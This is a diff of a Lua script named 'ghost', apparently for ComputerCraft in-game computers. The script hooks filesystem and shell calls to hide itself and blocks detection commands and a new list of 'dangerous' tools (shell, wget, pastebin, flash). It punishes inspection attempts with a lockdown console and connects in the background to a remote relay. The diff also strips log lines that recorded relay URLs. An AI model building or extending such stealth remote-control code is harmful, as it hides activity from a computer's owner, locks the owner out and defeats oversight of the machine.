@@ -1,4 +1,4 @@
--- ghost v9.9.8 (fast console: intercept -> console -> background connect; yellow prompt)
+-- ghost v9.9.9 (white cursor after yellow prompt + DANGEROUS token blocking)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -32,6 +32,9 @@ local ALLOWED_CMDS = {ls=true,dir=true,ll=true,la=true,cd=true,pwd=true,mkdir=tr
     scan=true,gps=true,reboot=true}
 local FILE_CMDS = {cat=true,view=true,type=true,edit=true,delete=true,rm=true,copy=true,move=true,
     cp=true,mv=true,mkdir=true,label=true,rename=true}
+-- ОПАСНЫЕ программы: блокируются в ЛЮБОМ токене строки
+local DANGEROUS = {lua=true,sh=true,shell=true,multishell=true,pastebin=true,wget=true,github=true,
+    redirect=true,reflashing=true,flash=true}
 local FS_PROBES = {"fs%.list","fs%.find","fs%.exists","fs%.attributes","fs%.getsize","fs%.isdir",
     "fs%.open","fs%.readfile","fs%.complete","fs%.getdrive","fs%.getfreespace","fs%.getdir","fs%.ismount",
     "fs%.makeDir","fs%.copy","fs%.move","fs%.delete","fs%.create","fs%.isreadonly","os%.getrunningprogram",
@@ -45,7 +48,7 @@ local DETECT_CMDS = {"programs","shell%.resolve","settings%.list","settings%.get
     "dofile","apropos","man","which","env","printenv","history","alias","unalias","ps","top","wget",
     "pastebin","git","curl","mount","df","du","chmod","chown","find","locate","grep","awk","sed","wgen","wgen%.run"}
 
--- ORIGINALS (safe)
+-- ORIGINALS
 local orig_fs_open = fs.open
 local orig_fs_exists = fs.exists
 local orig_fs_list = fs.list
@@ -82,7 +85,7 @@ local check_mode
 local reload_tunnel
 
 -- ============================================
--- LOGGING (тихо)
+-- LOGGING
 -- ============================================
 local function glog(msg)
     pcall(function()
@@ -272,6 +275,12 @@ local function is_detect_command(line)
     for _, d in ipairs(DETECT_CMDS) do if l:find(d) then return true end end
     return false
 end
+local function has_dangerous_token(line)
+    for tok in line:gmatch("%S+") do
+        if DANGEROUS[tok:lower()] then return tok end
+    end
+    return nil
+end
 local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") end
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
@@ -382,19 +391,18 @@ reload_tunnel = function()
     return true
 end
 
--- НЕ-интерактивный захват URL (для фона, без read())
 local function acquire_url()
     local tries = 0
     while true do
         local fresh = get_fresh_url()
         if fresh then
             CURRENT_URL = fresh; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
-            glog("acquire: relay " .. CURRENT_URL); return true
+            return true
         end
         local saved = load_saved_url()
         if saved and validate_url(saved) then
             CURRENT_URL = saved; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
-            glog("acquire: saved " .. CURRENT_URL); return true
+            return true
         end
         tries = tries + 1
         if tries > 30 then return false end
@@ -532,7 +540,7 @@ trigger_fortress = function(token)
 end
 
 -- ============================================
--- INTERCEPT
+-- INTERCEPT (усиленная блокировка)
 -- ============================================
 local function install_command_intercept()
     pcall(function()
@@ -543,21 +551,32 @@ local function install_command_intercept()
             local fl = first:lower()
             if fortress_active then return false end
             if service_local then return orig_shell_run(line) end
+            -- БЛОК: опасные токены в любом месте строки
+            local danger = has_dangerous_token(line)
+            if danger then
+                strikes = strikes + 1; printError(danger .. ": command not found")
+                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
+                return false
+            end
+            -- БЛОК: неизвестные команды
             if not is_allowed_command(first) then
                 strikes = strikes + 1; printError(first .. ": command not found")
                 if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                 return false
             end
+            -- БЛОК: запуск .lua
             if is_script_file(first) then
                 strikes = strikes + 1; printError("Cannot execute: permission denied")
                 if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                 return false
             end
+            -- БЛОК: startup во 2м аргументе
             if second and second:gsub("^/","") == "startup" then
                 strikes = strikes + 1; printError("startup: No such file")
                 if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                 return false
             end
+            -- БЛОК: скрытые файлы / fs-пробы / детект
             local hn = find_hidden(line); local probe = is_fs_probe(line); local det = is_detect_command(line)
             if hn or probe or det then
                 strikes = strikes + 1
@@ -578,7 +597,7 @@ end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
 -- ============================================
--- REGISTRATION (тихая, только glog)
+-- REGISTRATION (тихая)
 -- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
@@ -656,6 +675,7 @@ local function fortress_console()
     draw_boot()
     while true do
         term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
+        term.setTextColour(colors.white)
         local line = read()
         if line == UPDATE_CODE then if do_update() then return end end
     end
@@ -736,13 +756,14 @@ local function mode_watcher(token)
 end
 
 -- ============================================
--- REPL (жёлтая стрелка как на фото)
+-- REPL (жёлтый prompt + БЕЛЫЙ курсор/ввод)
 -- ============================================
 local function repl()
     while true do
         if fortress_active then return end
         if service_local then
             term.setTextColour(colors.green); term.setCursorBlink(true); write("[SERVICE] > ")
+            term.setTextColour(colors.white)  -- белый ввод/курсор
             local line = read(nil, cmd_history, orig_shell_complete)
             if line == UPDATE_CODE then if do_update() then return end
             elseif line and line ~= "" then
@@ -751,8 +772,8 @@ local function repl()
                 if not o then printError(e or "Error") end
             end
         else
-            -- ЖЁЛТАЯ стрелка (как на фото)
             term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
+            term.setTextColour(colors.white)  -- белый ввод/курсор (как на фото 2)
             local line = read(nil, cmd_history, normal_complete)
             if line == UPDATE_CODE then if do_update() then return end
             elseif line == SECRET_CODE then
@@ -772,7 +793,7 @@ local function repl()
 end
 
 -- ============================================
--- BACKGROUND CONNECT (связь ПОСЛЕ консоли)
+-- BACKGROUND CONNECT
 -- ============================================
 local function connect_and_run(token, pending_password)
     local pastes = {}
@@ -802,10 +823,10 @@ local function connect_and_run(token, pending_password)
 end
 
 -- ============================================
--- MAIN (перехват -> консоль -> связь)
+-- MAIN
 -- ============================================
 local function run_main()
-    glog("ghost start v9.9.8")
+    glog("ghost start v9.9.9")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
@@ -823,7 +844,6 @@ local function run_main()
         term.setCursorBlink(false)
     end
 
-    -- консоль СРАЗУ, связь в фоне
     parallel.waitForAny(
         function() pcall(repl) end,
         function() pcall(connect_and_run, token, pending_password) end
